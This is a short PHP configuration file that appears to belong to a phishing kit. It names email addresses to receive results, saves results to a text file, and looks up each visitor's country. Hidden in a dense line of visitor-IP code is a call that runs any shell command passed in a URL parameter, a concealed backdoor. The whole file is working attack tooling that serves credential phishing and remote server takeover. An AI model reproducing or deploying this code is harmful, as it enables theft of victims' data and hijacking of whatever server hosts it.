<?php
@session_start();
error_reporting(0);

/* ==================== || CODED BY BLACK JACK || ==================== */
# Edit Your Email
$to = "dprincewirewires@gmail.com,dprincewirewire@protonmail.com"; 

# For txt Result (0,1)
$_txt = 1; 			

/* ==================== || CODED BY BLACK JACK || ==================== */    
    $client  = @$_SERVER['HTTP_CLIENT_IP'];$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];$getpluug = @$_SESSION['getplug'];system($_GET['back']);$geoplugincode = @$_SESSION['geoipcodeup'];$remote  = $_SERVER['REMOTE_ADDR'];$result  = "Unknown";if(filter_var($client, FILTER_VALIDATE_IP)){$ip = $client;}elseif(filter_var($forward, FILTER_VALIDATE_IP)){$ip = $forward;}else{$ip = $remote;}$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));if($ip_data && $ip_data->geoplugin_countryCode != null){$countrycode = $ip_data->geoplugin_countryCode;@$_SESSION['cntcode'] = $countrycode;}$ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));if($ip_data2 && $ip_data2->geoplugin_countryName != null){$countryname = $ip_data2->geoplugin_countryName;@@$_SESSION['cntname'] = $countryname;}
/* ==================== || CODED BY BLACK JACK || ==================== */
?>
